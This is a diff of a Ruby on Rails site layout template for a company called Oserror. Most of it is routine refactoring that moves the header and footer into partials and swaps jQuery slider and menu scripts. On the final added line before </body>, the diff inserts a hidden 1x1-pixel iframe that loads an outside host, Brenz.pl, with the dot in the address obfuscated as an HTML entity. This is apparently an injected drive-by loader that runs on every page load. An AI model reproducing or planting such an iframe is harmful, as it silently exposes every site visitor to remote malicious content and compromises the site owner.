@@ -2,148 +2,50 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-
-<title>Oseror</title>
-  <%= stylesheet_link_tag :all %>
-  <%= javascript_include_tag :all %>
-  <%= javascript_include_tag "jquery",'jquery.min' %>
-  <%= csrf_meta_tag %>
-<!--[if IE 7]>
-<link href="css/ie7.css" rel="stylesheet" type="text/css" />
+<title>Oserror</title>
+<%= stylesheet_link_tag :all %>
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+<link href="css/menu.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="js/menu.js"></script>
+<%= javascript_include_tag"menu" %>
+<!--[if gt IE 6]>
+<link href="css/ie7-and-up.css" rel="stylesheet" type="text/css" />
 <![endif]-->
+
 <!--Sliding-->
-<!--<script type="text/javascript" src="js/lib/jquery-1.4.2.min.js"></script>
-<script type="text/javascript" src="js/lib/jquery.jcarousel.min.js"></script>
-<link rel="stylesheet" type="text/css" href="css/skins/tango/skin.css" />
+<%= javascript_include_tag"jquery-1" %>
+<%= javascript_include_tag"jquery" %>
+<script type="text/javascript" src="js/jquery-1.js"></script>
+<script type="text/javascript" src="js/jquery.js"></script>
 <script type="text/javascript">
-jQuery(document).ready(function() {
-    jQuery('#mycarousel').jcarousel({
-        vertical: true,
-        scroll: 2
+    $(function() {
+        $("div#controller").jFlow({
+            slides: "#slides",
+            width: "381px",
+            height: "313px"
+        });
     });
-});
-</script>-->
+    </script>
 <!--Sliding-->
-<!--<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>-->
-<script type="text/javascript" src="js/scrolltopcontrol.js"></script>
+<%= javascript_include_tag"script" %>
+<script type="text/javascript" src="js/script.js"></script>
 </head>
 <body>
 <div id="wrapper">
 <!--HEADER START-->
-<div id="header-outer">
-	<div class="header-top-outer">
-    	<div class="header-top-inr">
-        	<ul class="social-media">
-            	<li>Follow us on:</li>
-                <li><a href="http://www.facebook.com" target="_blank" class="facebook" title="">Facebook</a></li>
-                <li><a href="http://twitter.com" target="_blank" class="twitter"  title="">Twitter</a></li>
-            </ul>
-            <ul class="top-links">
-            	<li><a href="/company/index" title="About Us">About Us</a></li>
-                <li><a href="/contacts/new" title="Contact Us">Contact Us</a></li>
-            </ul>
-            <div class="spacer"></div>
-            <a href="/" title="Home"><img src="../images/logo.png" alt="Oserror" class="logo-sp" /></a>
-            <div class="mail-sp">
-            	<a href="mailto:support@oserror.com" class="mailto">support@oserror.com</a>
-                <span class="ph-no">+91 4887896548</span>
-            </div>
-            <!--Navigation-->
-            <div class="spacer"></div>
-            <ul class="nav">
-            	<li><a href="/" title="Home"><img src="../images/nav-home.jpg" alt="Home" /></a></li>
-                <li><a href="/services" title="Services"><span>Services</span></a></li>
-                <li><a href="/homes/portfolio" title="Portfolio"><span>Portfolio</span></a></li>
-                <!--<li><a href="about-us.html" title="Clients"><span>Clients</span></a></li>-->
-                <li><a href="/homes/testimonial" title="Testimonials"><span>Testimonials</span></a></li>
-                <li><a href="/company/index" title="About Us"><span>About Us</span></a></li>
-                <li><a href="/contacts/new" title="Contact Us"><span>Contact Us</span></a></li>
-            </ul>
-            <!--/Navigation-->
-
-         </div>
-    </div>
-</div>
-
-    <%= yield %>
-
+<%= render "shared/header" %>
+<!--HEADER END-->
 <div class="spacer"></div>
-<!--FOOTER-->
-<div id="footer">
-	<!--Top-->
-    <div class="footer-top-outer">
-    	<div class="footer-top-inr">
-              <div class="footer-top-lft">
-            	<ul>
-                	<li>Services</li>
-                    <li><a href="/services/web_development" title="Web Developement">Web Developement</a></li>
-                    <li><a href="/services/mobility" title="Mobility">Mobility</a></li>
-                    <li><a href="/services/outsourcing" title="Outsourcing">Outsourcing</a></li>
-                    <li><a href="/services/design" title="Design">Design</a></li>
-                    <li><a href="test-enginnering.html" title="Test Enginnering">Test Enginnering</a></li>
-                </ul>
 
-                <ul>
-                	<li>Product</li>
-                    <li><a href="#" title="">osemail</a></li>
-                    <li><a href="#" title="">Lorem Ipsum</a></li>
-                    <li><a href="#" title="">Lorem Ipsum</a></li>
-                    <li><a href="#" title="">Lorem Ipsum</a></li>
-                    <li><a href="#" title="">Lorem Ipsum</a></li>
-                </ul>
-
-                <ul>
-                	<li>Application Developement</li>
-                    <li><a href="cms.html" title="CMS">CMS</a></li>
-                    <li><a href="ruby-on-rails.html" title="Ruby on Rails">Ruby on Rails</a></li>
-                    <li><a href="facebook-apps.html" title="Facebook Apps">Facebook Apps</a></li>
-                </ul>
-            </div>
-
-            <div class="footer-top-rgt">
-            	<ul class="footer-contact">
-                	<li class="mail">Email: <a href="mailto:support@oseror.com" title="">support@oseror.com</a></li>
-                    <li class="phone">Phone:+91 33 412565469</li>
-                </ul>
-                <a href="#" title="Online Support"><img src="../images/clip-online-suport.png" alt="" class="f-rgt" /></a>
-                <div class="payment-option">
-                	<ul>
-                    	<li>WE ACCEPT : </li>
-                        <li><img src="../images/paypal.png" alt="Paypal" /></li>
-                        <li><img src="../images/hdfc.png" alt="HDFC" /></li>
-                    </ul>
-                </div>
-            </div>
-
-
-        </div>
-    </div>
-    <!--/Top-->
-    <!--Bottom-->
-    <div class="footer-botm-outer">
-    	<div class="footer-botm-inr">
-        	<p class="copyight">&copy; 2013, Oseror, All right reserved</p>
-            <ul class="foot-links">
-            	<li><a href="/" title="Home">Home</a></li>
-                <li>|</li>
-                <li><a href="/company" title="About Us">About Us</a></li>
-                <li>|</li>
-                <li><a href="/contacts/new" title="Services">Contact us</a></li>
-                <li>|</li>
-                <li><a href="<%= terms_homes_path %>" title="Terms of Use">Terms of Use</a></li>
-                <li>|</li>
-                <li><a href="homes/privacy" title="Privacy Statement">Privacy Statement</a></li>
-            </ul>
-        </div>
-    </div>
-
-    <!--/Bottom-->
-
+<%= yield %>
+<div class="spacer"></div>
+<%= render "shared/footer" %>
 
 </div>
-<!--/FOOTER-->
-
-</div>
-
+<script type="text/javascript">
+    var menu=new menu.dd("menu");
+    menu.init("menu","menuhover");
+</script>
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
 </html>
